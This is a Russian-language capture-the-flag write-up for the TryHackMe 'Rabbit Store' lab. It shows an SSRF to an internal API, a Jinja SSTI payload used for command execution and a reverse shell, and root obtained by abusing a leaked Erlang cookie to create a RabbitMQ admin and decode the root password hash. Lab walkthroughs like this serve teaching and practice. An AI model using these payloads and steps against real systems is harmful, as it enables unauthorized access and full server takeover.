# Сегодня решаем Rabbit Store от TRYHACKME


<img width="1487" height="1000" alt="{CE578074-2287-4441-8FF9-63EA7E3F7A29}" src="https://github.com/user-attachments/assets/f03e6aef-0a5d-4493-b7e3-60078fc68983" />

 
## Сканирование портов



```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://cloudsite.thm/
|_http-server-header: Apache/2.4.52 (Ubuntu)
4369/tcp  open  epmd    Erlang Port Mapper Daemon
25672/tcp open  unknown
```

### 80 Порт

<img width="2556" height="1092" alt="{D0903653-BB82-4E78-9005-B7AE41E1DABE}" src="https://github.com/user-attachments/assets/976e5277-749d-428c-ba15-82a3f2907d82" />

чтобы авторизоваться нам приходится добавить storage.cloudsite.thm в /etc/hosts/ так как авторизация проходит на домене storage.cloudsite.thm

<img width="2560" height="900" alt="{B870F9F1-549E-491D-80E2-95F8564C4058}" src="https://github.com/user-attachments/assets/220aedeb-2629-4b59-b974-7b809f5aebf3" />

в бурпе нашел jwt решил посмотреть на него в расшифрованном виде, вижу что в jwt используется subscription

<img width="984" height="694" alt="{763D1177-61FD-4100-8E5C-029B2CDE6877}" src="https://github.com/user-attachments/assets/cd02dd10-f13a-458a-a32f-c8d2fa3fd8d4" />


при логине показывает inactive от сервера, если бы был секретный ключ то мы могли бы подделать jwt, но увы у нас его нету




так что придем к другому варианту, попробуем ввести в /api/register - "subscription":"active" 


<img width="1520" height="742" alt="{D7538C7C-DDDE-46D9-B505-82EA4C4A6EC0}" src="https://github.com/user-attachments/assets/c83935b0-57c6-4bee-b204-53ca9f467e11" />

## SSRF 

---
SSRF (Server-Side Request Forgery) — это уязвимость веб-безопасности, которая позволяет злоумышленнику заставить уязвимый сервер отправлять произвольные сетевые запросы от своего имени
---

мы видим форму загрузки файлов на локальный хост, так же чуть ниже видим то что можно устанавливать любые файлы по ссылке, первым делом я решил проверить возможно ли ssrf, вписал http://127.0.0.1:80/ и получил главную страницу cloudsite.thm, так же упустил один важный фактор, до этого я проходился фаззингом на домене storage.cloudsite.thm и нашел /api/docs к которому я не имел доступа, так как он был access denied, логичным было попробовать http://127.0.0.1:80/api/docs, что я и сделал, но по итогу мне выдало 404, так я пришел к тому что искал другие открытые порты, наткнулся на 3000 порт, и после того как увидел главную страницу авторизации там, понял, что это то что нам нужно

<img width="2560" height="1285" alt="{8216FFDC-E607-4B0E-8398-ADE0855B4D02}" src="https://github.com/user-attachments/assets/4de573cb-4f0b-4455-b00c-cc51c0e33fa5" />

на этом скриншоте видно что как раз мой запрос к 3000 порту сработал

<img width="1921" height="1023" alt="{A638F7D0-3B4F-4BC8-8B7A-46941838B535}" src="https://github.com/user-attachments/assets/e15fd95f-2596-4241-8565-3101dadf5494" />

### Содержимое /api/docs

тут мы прекрасно наблюдаем все api ручки с которыми мы можем работать, /api/register - отвечает за регистрацию, /api/login - за аунтификацию, /api/upload - за загрузку файлов на сервер, /api/store-url за загрузку файлов через url, а вот /api/fetch_messeges_from_chatbot нам неизвестна, так что давайте попробуем ее поковырять

```
Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```

## SSTI to RCE

---
SSTI (Server-Side Template Injection) — это опасная уязвимость веб-приложений, которая возникает, когда пользовательский ввод небезопасно встраивается прямо в текст серверного шаблона
---
---
RCE (от англ. Remote Code Execution — удаленное выполнение / исполнение кода) — это опасная уязвимость программного обеспечения, которая позволяет злоумышленнику запустить произвольный код на целевом компьютере или сервере через локальную сеть или интернет
---

изначально я попробовал отправить запрос без переменной и получил ответ, что это некорректное содержимое username, так я и понял что там нужно работать с username, первый делом я решил ввести туда сообщение "username":"admin" и увидел ошибку - sorry, **admin**, our... тут я и понял что есть возможность проверки ssti

для начала я решил проверить базовый пайлоуд {{8*8}} и увидел что сервер отвечает так, как это делает уязвимый сервер

<img width="1489" height="726" alt="{1C60B2E7-3231-470F-B1AE-7862148D2805}" src="https://github.com/user-attachments/assets/e3147daa-6fe6-4598-aeca-4ef7d3848b9a" />

тут я уже ввел poc ssti который выглядит так - ```{{lipsum.__globals__['os'].popen('id').read()}}``` - вместо id я подставил команду для revshell

<img width="784" height="173" alt="{17E11B39-39A3-45B0-A203-5087225C3964}" src="https://github.com/user-attachments/assets/02a19493-044f-4b85-9954-2ac3404c0445" />

как мы видим я получил rce

# LPE

---
LPE означает локальное повышение привилегий (от англ. Local Privilege Escalation)
---


Прежде чем использовать сканера и искать через них способы к LPE я решаю побегать по директориям и посмотреть что тут есть интересное

```
azrael@forge:~/snap$ ls -la
ls -la
total 12
drwx------ 3 azrael azrael 4096 Mar 22  2024 .
drwx------ 9 azrael azrael 4096 Sep 12  2024 ..
drwxr-xr-x 5 azrael azrael 4096 Sep 20  2024 lxd
azrael@forge:~/snap$ cd lxd
cd lxd
azrael@forge:~/snap/lxd$ ls -la
ls -la
total 20
drwxr-xr-x 5 azrael azrael 4096 Sep 20  2024 .
drwx------ 3 azrael azrael 4096 Mar 22  2024 ..
drwxr-xr-x 2 azrael azrael 4096 Mar 22  2024 24061
drwxr-xr-x 2 azrael azrael 4096 Mar 22  2024 29619
drwxr-xr-x 3 azrael azrael 4096 Mar 22  2024 common
lrwxrwxrwx 1 azrael azrael    5 Sep 20  2024 current -> 29619
azrael@forge:~/snap/lxd$ cd common
cd common
azrael@forge:~/snap/lxd/common$ ls -la
ls -la
total 12
drwxr-xr-x 3 azrael azrael 4096 Mar 22  2024 .
drwxr-xr-x 5 azrael azrael 4096 Sep 20  2024 ..
drwxrwxr-x 2 azrael azrael 4096 Mar 22  2024 config
azrael@forge:~/snap/lxd/common$ cd config
cd config
azrael@forge:~/snap/lxd/common/config$ ls -la
ls -la
total 12
drwxrwxr-x 2 azrael azrael 4096 Mar 22  2024 .
drwxr-xr-x 3 azrael azrael 4096 Mar 22  2024 ..
-rw-rw-r-- 1 azrael azrael  188 Mar 22  2024 config.yml
azrael@forge:~/snap/lxd/common/config$ cat config.yml
cat config.yml
default-remote: local
remotes:
  images:
    addr: https://images.linuxcontainers.org
    protocol: simplestreams
    public: true
  local:
    addr: unix://
    public: false
aliases: {}
azrael@forge:~/snap/lxd/common/config$ groups azrael
groups azrael
azrael : azrael
azrael@forge:~/snap/lxd/common/config$ getent group lxd
getent group lxd
lxd:x:117:
azrael@forge:~/snap/lxd/common/config$ id
id
uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
azrael@forge:~/snap/lxd/common/config$ grep '^lxd:' /etc/group
grep '^lxd:' /etc/group
lxd:x:117:
azrael@forge:~/snap/lxd/common/config$ 
```
как мы видим моя первая попытка поиска не увенчалась успехом, я не состою в группе lxd, так что не смогу получить root от него, посмотрев еще какое то время директории я перешел к использованию linpeas 


#### Ответ linpeas (сокращенный) 
```
azrael@forge://tmp$ ./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                 
    |---------------------------------------------------------------------------------|                                                                                                 
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |                                                                                                 
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                 
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                 
    |---------------------------------------------------------------------------------|                                                                                                 
    |                                 Thank you!                                      |                                                                                                 
    \---------------------------------------------------------------------------------/                                                                                                 
          LinPEAS-ng by carlospolop                                                                                                                                                     
                                                                                                                                                                                        
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                      
                                                                                                                                                                                        
Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:                                                                                                                                                                                
  RED/YELLOW: 95% a PE vector
  RED: You should take a look into it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                     
                               ╚═══════════════════╝                                                                                                                                    
OS: Linux version 5.15.0-118-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #128-Ubuntu SMP Fri Jul 5 09:28:59 UTC 2024
User & Groups: uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
Hostname: forge

[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                 
[+] /usr/bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)                                                      
                                                                                                                                                                                        

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
uniq: write error: Broken pipe
DONE
                                                                                                                                                                                        
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                      
                              ╚════════════════════╝                                                                                                                                    
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                                                       
Linux version 5.15.0-118-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #128-Ubuntu SMP Fri Jul 5 09:28:59 UTC 2024
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.4 LTS
Release:        22.04
Codename:       jammy

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                                                          
Sudo version 1.9.9                                                                                                                                                                      


╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                                                  
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                                                  

╔══════════╣ Date & uptime
Fri Oct  2 04:17:12 AM UTC 2026                                                                                                                                                         
 04:17:12 up  1:07,  0 users,  load average: 0.52, 0.15, 0.05

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                               
/dev/disk/by-id/dm-uuid-LVM-NEMzNrZYjkz0jtJBa1M9v8xFFALHwKo1ZvZD1ZJrwjDEyesKmV2qmsCXOJa86oPO    /       ext4    defaults        0 1                                                     
/dev/disk/by-uuid/363644ae-f249-4fde-9994-38dc08419512  /boot   ext4    defaults        0 1

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                    

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                 
LESSOPEN=| /usr/bin/lesspipe %s                                                                                                                                                         
USER=azrael
SHLVL=2
HOME=/home/azrael
OLDPWD=//
PYTHONUNBUFFERED=1
WERKZEUG_SERVER_FD=4
LOGNAME=azrael
_=./linpeas.sh
WERKZEUG_RUN_MAIN=true
LANG=en_US.UTF-8
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=//tmp

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                                                   
dmesg Not Found                                                                                                                                                                         
                                                                                                                                                                                        
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                      
cat: write error: Broken pipe                                                                                                                                                           
cat: write error: Broken pipe
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: probable
   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154




╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3766 Jun  5  2024 /etc/cloud/cloud.cfg                                                                                                                           
    lock_passwd: True
-rw-r--r-- 1 root root 3786 Dec  8  2022 /snap/core20/1828/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3756 Feb 27  2024 /snap/core20/2318/etc/cloud/cloud.cfg
    lock_passwd: True

╔══════════╣ Analyzing Erlang Files (limit 70)
-r-----r-- 1 rabbitmq rabbitmq 16 Oct  2 03:10 /var/lib/rabbitmq/.erlang.cookie                                                                                                         
uOJn1gFOvRhmAmrX

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb 13  2024 /etc/apt/keyrings                                                                                                                              
drwx------ 2 azrael azrael 4096 Jul 18  2024 /home/azrael/.local/share/keyrings
drwxr-xr-x 2 root root 200 Feb  7  2023 /snap/core20/1828/usr/share/keyrings
drwxr-xr-x 2 root root 200 Apr 16  2024 /snap/core20/2318/usr/share/keyrings
drwxr-xr-x 2 root root 4096 Aug 15  2024 /usr/share/keyrings

```

PwnKit тут нету, так как версия ядра пропатчена. Sudo тоже нельзя как то использовать так как ядро было пропатчено. Единственное что еще я увидел так это токен к aws (который никак мне не помог так как я не могу пользоваться им без root прав), и токен rabbitmq, попробуем через него повысить привилегии 


Сначала я создам отдельную папку в /tmp для удобства, добавлю туда куки в файл .erlang.cookie, и дам ему права 600
```
zrael@forge:/tmp/az_home$ printf 'uOJn1gFOvRhmAmrX' > /tmp/az_home/.erlang.cookie
<tf 'uOJn1gFOvRhmAmrX' > /tmp/az_home/.erlang.cookie
azrael@forge:/tmp/az_home$ chmod 600 /tmp/az_home/.erlang.cookie

chmod 600 /tmp/az_home/.erlang.cookie
azrael@forge:/tmp/az_home$ 
azrael@forge:/tmp/az_home$ cat /tmp/az_home/.erlang.cookie; echo
cat /tmp/az_home/.erlang.cookie; echo
uOJn1gFOvRhmAmrX
```
после этого я решил проверить работает ли на хосте rabbit, или же это просто трата времени
```
azrael@forge:/tmp/az_home$ HOME=/tmp/az_home erl -sname azrael -noshell -eval '
  io:format("ping: ~p~n", [net_adm:ping(rabbit@forge)]),
  init:stop().
<OME=/tmp/az_home erl -sname azrael -noshell -eval '
>   io:format("ping: ~p~n", [net_adm:ping(rabbit@forge)]),
>   init:stop().
> 
'
ping: pong

```
как мы видим rabbit ответил нам, так что мы можем продолжать.


я хочу проверить пользователей и какие у их права

```
[[{user,<<"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.">>},
  {tags,[]}],
 [{user,<<"root">>},{tags,[administrator]}]]
```

по итогу вижу сообщение в котором говориться - "The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256" если мы узнаем sha-256 от root RabbitMQ то получим пароль рута в системе

# Создание пользователя в rabbitmq

создаю пользователя pwn с паролем pwn123 с правами - administrator, так же проверяю через curl какой пароль все таки от root

```
HOME=/tmp/az_home erl -sname azrael -noshell -eval '
  rpc:call(rabbit@forge, rabbit_auth_backend_internal, add_user,
           [<<"pwn">>, <<"pwn123">>, [administrator]]),
  init:stop().
'
azrael@forge:/tmp/az_home$ curl -s -u pwn:pwn123 http://localhost:15672/api/users/root | python3 -m json.tool

<calhost:15672/api/users/root | python3 -m json.tool

{
    "name": "root",
    "password_hash": "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF",
    "hashing_algorithm": "rabbit_password_hashing_sha256",
    "tags": [
        "administrator"
    ],
    "limits": {}
}
azrael@forge:/tmp/az_home$
```

Тут мы наблюдаем картину ввиде base64, расшифровав который мы получаем какую то кашу из битов, так что сразу же я решил использовать xxd -p -c 36 что бы получить вменяемый текст


```
echo "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF" | base64 -d | xxd -p -c 36

e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
```

e3d7ba85 - это соль, а это уже sha256 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585

вводим пароль для root

<img width="828" height="113" alt="{ED21F28B-9931-4FFD-B0BD-C8D7EDE5A593}" src="https://github.com/user-attachments/assets/80c6a5c2-df06-4337-b790-9f0b2266421b" />

вот мы и root

<img width="824" height="482" alt="{ACDF1B8C-8599-4567-AE4E-6146A316A975}" src="https://github.com/user-attachments/assets/1a536357-fc6d-420e-b0be-5fcd58aef232" />


